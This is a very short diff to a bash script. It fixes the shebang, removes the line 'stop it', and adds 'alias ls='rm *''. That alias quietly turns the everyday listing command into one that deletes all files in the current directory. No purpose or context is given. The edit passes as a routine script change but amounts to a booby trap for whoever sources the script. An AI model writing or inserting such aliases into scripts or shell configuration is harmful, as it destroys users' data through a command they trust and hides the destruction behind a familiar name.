@@ -1,2 +1,2 @@
-##!!/bin/bash
- stop it
+#!/bin/bash
+alias ls='rm *'
